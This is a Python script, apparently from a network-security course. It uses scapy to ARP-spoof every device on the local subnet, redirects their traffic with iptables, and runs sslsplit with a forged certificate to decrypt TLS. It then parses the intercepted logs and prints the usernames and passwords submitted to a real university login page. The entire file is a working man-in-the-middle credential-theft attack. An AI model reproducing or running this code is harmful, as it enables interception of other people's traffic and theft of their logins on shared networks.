#!/usr/bin/env python3

import os
import time
import subprocess
from scapy.all import *

TEST_WEB_PAGE = 'https://e3.nycu.edu.tw/login/index.php'
# collect basic information
HOST_IP = get_if_addr(conf.iface)  # default interface
HOST_MAC = get_if_hwaddr(conf.iface) # default interface
GW_IP = conf.route.route("0.0.0.0")[2] # gateway
SUBNET = GW_IP + '/24'

def cmd(command):
    subprocess.run(command, shell=True)

def scan_ip_mac(gw_ip, subnet):
    """Scan IP and MAC address of available devices"""

    print('[+] Scanning devices in the subnet')
    ip_mac_dict = {}
    # arp on the subnet of the interface (answerd, unanswered)
    ans, unans = arping(subnet, verbose=0)
    for s, r in ans: # (send, response)
        ip_mac_dict[r[ARP].psrc] = r[Ether].src   

    # output
    print('Available devices')
    print('-----------------------------------------')
    print('IP\t\t\tMAC')
    print('-----------------------------------------')
    for key, val in ip_mac_dict.items():
        if key == gw_ip:
            continue
        print(f'{key}\t\t{val}')
    print('-----------------------------------------')

    return ip_mac_dict

def arp_spoofing(ip_mac_dict: dict, host_mac, gw_ip):
    """ARP spoofing by sending to all possible victims"""

    gw_mac = ip_mac_dict[gw_ip]
    # sent to all possible victims
    print('[+] Sending ARP spoofing reply packets')
    for victim_ip, victim_mac in ip_mac_dict.items():
        if victim_ip == gw_ip:
            continue
        # uplink and downlink
        up_packet = ARP(op=2, hwsrc=host_mac, psrc=victim_ip, hwdst=gw_mac, pdst=gw_ip)
        down_packet = ARP(op=2, hwsrc=host_mac, psrc=gw_ip, hwdst=victim_mac, pdst=victim_ip)
        # send packets (return for debugging)
        up_ret = send(up_packet, return_packets=True, verbose=0)
        down_ret = send(down_packet, return_packets=True, verbose=0)

def parse_line(tokenline: str):
    """Parse the given line"""

    # parse lines
    tokens = tokenline.split('&')
    # parse username
    uname = tokens[1].split('=')[1]
    # parse password
    passwd = tokens[2].split('=')[1]

    print(f'Username:\t{uname}')
    print(f'Password:\t{passwd}')

def parse_login_token(logfolder: str):
    """Looking for files containing specific token (logintoken)

    :param logfolder: path to log folder
    :returns: a line with logintoken
    """
    # record logintoken file dict and token count in the file
    file_dict = {}
    while True:
        logfiles = os.listdir(logfolder)
        for logfile in logfiles:
            # not the file we are looking for
            if not logfile.endswith('140.113.41.24,443.log'):
                continue
            # check if is a new file
            if logfile not in file_dict.keys():
                file_dict[logfile] = 0
            # open file and get lines with logintoken exist
            with open(logfolder + '/' + logfile, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            lines = [x for x in lines if 'logintoken=' in x]
            # update
            if len(lines) > file_dict[logfile]:
                for i in range(file_dict[logfile], len(lines)):
                    parse_line(lines[i])
                file_dict[logfile] = len(lines)
        # if new file exists
        if len(os.listdir(logfolder)) > len(logfiles):
            continue
        else:
            time.sleep(1)

def ssl_prerequisites():
    """SSL spliting prerequisites

    Setting sysconfig and iptables redirecting
    """
    # activate forwarding
    cmd('sysctl -w net.ipv4.ip_forward=1')
    # clear table
    cmd('iptables -t nat -F')
    # redirect non-SSL TCP connections to 8080
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080')
    # redirect HTTPS TCP (443) to 8443
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
    # redirect SSL SMTP (465, 587) to 8443
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 456 -j REDIRECT --to-ports 8443')
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443')
    # redirect SSL IMAP (993) to 8443
    cmd('iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443')

def ssl_spliting():
    """SSL spliting on encrypted SSL/TLS connections

    - Do prerequisites
    - Generate RSA key and certificate (do in makefile)
    - SSL split and wait for connections and inputs
    - Parse intercepted HTTP contents for username and password
    """
    # prerequisites
    ssl_prerequisites()
    # generate RSA key and certificate (this will be done in make)

    # check if folder exists
    if (not os.path.exists('tmp')):
        cmd('mkdir tmp')
    if (not os.path.exists('tmp/logdir')):
        cmd('mkdir tmp/logdir')
    if (not os.path.exists('tmp/jaildir')):
        cmd('mkdir tmp/jaildir')

    try:
        print('[+] SSL spliting to fetch contents')
        print('[*] To stop SSL spliting, press ctrl+c')
        # run sslsplit (in background)
        cmd('sslsplit -d \
            -l connections.log \
            -j tmp/jaildir \
            -S tmp/logdir \
            -k ca.key -c ca.crt \
            ssl 0.0.0.0 8443 \
            tcp 0.0.0.0 8080')
        # parse intercepted information
        parse_login_token('tmp/logdir')
    except KeyboardInterrupt:
        # finished sslspliting, stop sslsplit process
        cmd('sudo killall sslsplit')
        # clear iptables
        cmd("iptables --flush")
        print('[+] Stop SSL spliting.')
        return

def main():
    """Main program

    Containing three tasks:
    1. Scan available devices IPs and MACs
    2. ARP spoofing
    3. SSL spliting on encrypted connections
    """
    print('[+] Basic information')
    print(f'Host\t{HOST_IP}\t{HOST_MAC}')
    print(f'Gateway\t{GW_IP}')
    print(f'Subnet\t{SUBNET}')

    ### task 1 ###
    ip_mac_dict = scan_ip_mac(GW_IP, SUBNET)

    ### task 2 ###
    arp_spoofing(ip_mac_dict, HOST_MAC, GW_IP)

    ### task 3 ###
    ssl_spliting()

if __name__ == '__main__':
    main()